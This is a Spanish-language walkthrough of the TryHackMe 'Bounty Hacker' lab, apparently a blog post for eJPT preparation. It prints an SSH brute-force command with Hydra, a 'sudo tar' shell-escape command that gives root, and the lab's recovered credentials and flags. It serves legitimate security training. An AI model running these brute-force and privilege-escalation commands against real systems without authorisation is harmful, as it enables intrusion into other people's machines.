---
title: "Bounty Hacker"
date: 2025-12-24
draft: false
description: "Walkthrough de Bounty Hacker de TryHackMe. FTP anónimo con archivos de reconocimiento, bruteforce SSH con Hydra y escalada de privilegios via sudo tar — preparación eJPT."
tags:
  [
    "walkthrough",
    "tryhackme",
    "ejpt",
    "linux",
    "ftp",
    "hydra",
    "ssh",
    "tar",
    "sudo",
  ]
categories: ["Walkthroughs"]
series: ["Road to eJPTv2"]
ShowToc: true
TocOpen: false
weight: 5
---

## Resumen

**Bounty Hacker** es la quinta máquina de la serie _Road to eJPTv2_ y una de las más directas en términos de flujo de ataque. El FTP anónimo no solo confirma configuraciones laxas — esta vez **entrega directamente** un wordlist de contraseñas y el nombre de usuario objetivo. Con esos datos, Hydra hace el trabajo pesado contra SSH. La escalada via `sudo tar` introduce un nuevo binario de GTFOBins que vale la pena conocer.

| Atributo       | Valor                                                    |
| -------------- | -------------------------------------------------------- |
| **Plataforma** | TryHackMe                                                |
| **Dificultad** | Fácil                                                    |
| **OS**         | Linux                                                    |
| **Sala**       | [Bounty Hacker](https://tryhackme.com/room/cowboyhacker) |
| **Skills**     | FTP Enum, SSH Bruteforce, Sudo Privesc (tar)             |

### 🎥 Versión en video

{{< youtube -5pLjSCvwGo >}}

> Si prefieres seguir el walkthrough paso a paso, continúa leyendo. El video cubre el mismo proceso en formato visual.

### Herramientas usadas

- `nmap` — enumeración de puertos y servicios
- `ftp` — acceso anónimo y descarga de archivos
- `hydra` — bruteforce SSH con wordlist obtenido del FTP
- `ssh` — acceso con credenciales obtenidas

### Resumen de la solución

1. Nmap revela FTP (21), SSH (22) y HTTP (80)
2. FTP anónimo expone dos archivos: `task.txt` (usuario `lin`) y `locks.txt` (wordlist de contraseñas)
3. Hydra bruteforce SSH con `lin` y `locks.txt` → contraseña `RedDr4gonSynd1cat3`
4. Acceso SSH como `lin` → flag de usuario
5. `sudo -l` revela que `lin` puede ejecutar `/bin/tar` como root
6. Abuso de `sudo tar` con payload de shell → root

---

## Reconocimiento

### Verificación de conectividad

```bash
ping -c 1 10.67.160.220
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

> **Nota sobre `--open`:** este flag filtra la salida mostrando solo puertos abiertos, ignorando los filtrados o cerrados. Útil para no distraerse con ruido en máquinas con muchos puertos filtrados — como esta, que tenía 55531 puertos filtrados.

Escaneo dirigido con versiones y scripts:

```bash
nmap 10.67.160.220 -n -Pn -sS -sCV -p21,22,80 --min-rate=5000 -oN scanBounty.txt
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
    ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
```

> **Hallazgos clave:**
>
> - **Puerto 21:** vsftpd con login anónimo habilitado — primer vector a explorar
> - **Puerto 22:** SSH — potencial objetivo de bruteforce si encontramos credenciales
> - **Puerto 80:** Apache — revisión web pendiente

### Enumeración FTP anónimo

```bash
ftp 10.67.160.220 21
Name: anonymous
230 Login successful.
ftp> ls
-rw-rw-r-- 1 ftp ftp  418 Jun 07 2020 locks.txt
-rw-rw-r-- 1 ftp ftp   68 Jun 07 2020 task.txt
```

Dos archivos accesibles. Los descargamos:

```bash
ftp> get locks.txt
ftp> get task.txt
```

Revisamos su contenido:

**`task.txt`** — lista de tareas firmada por el usuario `lin`:

1.) Protect Vicious.
2.) Get Trophies on the shelf.

> **Hallazgo crítico:** el archivo está firmado por **`lin`** — tenemos un nombre de usuario válido del sistema.

**`locks.txt`** — lista de posibles contraseñas (wordlist personalizado):

```bash
rEddrAGON
ReDdr4gON
RedDr4gonSynd1cat3
```

> **Situación ideal para el atacante:** el servidor FTP anónimo acaba de entregarnos el usuario (`lin`) y su wordlist de contraseñas (`locks.txt`). Esto es un error de configuración crítico — nunca expongas archivos sensibles en FTP anónimo.

---

## Explotación

### Bruteforce SSH con Hydra

Con el usuario y el wordlist en mano, lanzamos Hydra contra SSH:

```bash
hydra -l lin -P ./locks.txt ssh://10.67.160.220 -t 4
```

**Justificación de los flags:**

- `-l lin` usuario único (ya lo sabemos del `task.txt`)
- `-P locks.txt` wordlist personalizado obtenido del FTP
- `-t 4` 4 tareas paralelas (más alto puede causar bloqueos en SSH)

**Justificación de los flags:**

- `-l lin` usuario único (ya lo sabemos del `task.txt`)
- `-P locks.txt` wordlist personalizado obtenido del FTP
- `-t 4` 4 tareas paralelas (más alto puede causar bloqueos en SSH)

```bash
[22][ssh] host: 10.67.160.220  login: lin  password: RedDr4gonSynd1cat3
```

> **Credenciales obtenidas:** `lin:RedDr4gonSynd1cat3`

El ataque terminó en **10 segundos** porque el wordlist era pequeño y personalizado. Esta es la diferencia entre un wordlist genérico (rockyou.txt con 14 millones de entradas) y uno dirigido — cuando tienes el wordlist correcto, el bruteforce es casi instantáneo.

### Acceso SSH

```bash
ssh lin@10.67.160.220
Welcome to Ubuntu 20.04.6 LTS
lin@ip-10-67-160-220:~$
```

---

## Post-explotación

### Flag de usuario

```bash
cat ~/Desktop/user.txt
```

> **Flag de usuario:** `THM{CR1M3_SyNd1C4T3}`

### Enumeración de sudo

```bash
sudo -l
User lin may run the following commands on ip-10-67-160-220:
(root) /bin/tar
```

> **Hallazgo crítico:** `lin` puede ejecutar `tar` como root sin contraseña. `tar` es un compresor/descompresor de archivos que en condiciones normales no debería tener permisos sudo. GTFOBins documenta exactamente cómo abusar de esto.

---

## Escalada de privilegios

### Abuso de sudo tar

`tar` tiene un flag `-I` que permite especificar un programa externo para comprimir/descomprimir. Podemos abusar de esto para ejecutar comandos arbitrarios con privilegios de root:

```bash
sudo tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'
```

```bash
# whoami
root
```

> **¿Qué hace este comando?**
>
> - `sudo tar` ejecuta tar con privilegios de root
> - `xf /dev/null` intenta extraer de `/dev/null` (archivo vacío — no falla pero tampoco hace nada real)
> - `-I '/bin/sh -c "sh <&2 1>&2"'` especifica como "descompresor" una shell `/bin/sh`
> - `<&2 1>&2` redirige stdin desde stderr y stdout hacia stderr — trick para obtener una shell interactiva desde tar

### Flag de root

```bash
cd /root
cat root.txt
```

> **Flag de root:** `THM{80UN7Y_h4cK3r}`

---

## Lecciones aprendidas

- **FTP anónimo puede ser más peligroso de lo que parece** — En máquinas anteriores (Simple CTF) el FTP anónimo no dio información útil directa. Aquí entregó usuario y wordlist. Siempre listar y descargar todo lo que esté en un FTP anónimo antes de pasar al siguiente vector.
- **Un wordlist dirigido es exponencialmente más efectivo** — `locks.txt` tenía 26 contraseñas. rockyou.txt tiene 14 millones. Hydra encontró la contraseña en 10 segundos con el wordlist correcto. En un pentest real, recopilar información específica del objetivo antes de lanzar ataques de fuerza bruta marca la diferencia.
- **`sudo -l` sigue siendo el primer comando post-shell** — Cuatro máquinas seguidas con privesc via sudo. El patrón es consistente: siempre es lo primero que verificas.
- **GTFOBins no es solo Python y Vim** — `tar`, `find`, `awk`, `perl`, `nmap`... decenas de binarios comunes tienen técnicas de escape documentadas en GTFOBins. Aprende a buscar ahí cuando encuentres un binario inusual con sudo o SUID.
- **`--open` en Nmap es tu amigo** — En máquinas con muchos puertos filtrados, el flag `--open` limpia la salida y te enfoca en lo que importa. Úsalo cuando el primer escaneo muestre miles de puertos filtrados.

### Para la eJPT

Esta máquina ejercita habilidades directamente evaluadas en la eJPT:

- Enumeración FTP anónima con extracción de archivos
- Bruteforce SSH dirigido con Hydra
- Escalada de privilegios via sudo misconfiguration
- Uso de GTFOBins como referencia de privesc

**Tiempo aproximado de resolución:** 15-20 minutos — una de las máquinas más rápidas de la serie una vez que entiendes el flujo.

---

## Referencias

- [Bounty Hacker — TryHackMe](https://tryhackme.com/room/cowboyhacker)
- [GTFOBins — tar](https://gtfobins.github.io/gtfobins/tar/)
- [Hydra documentation](https://github.com/vanhauser-thc/thc-hydra)
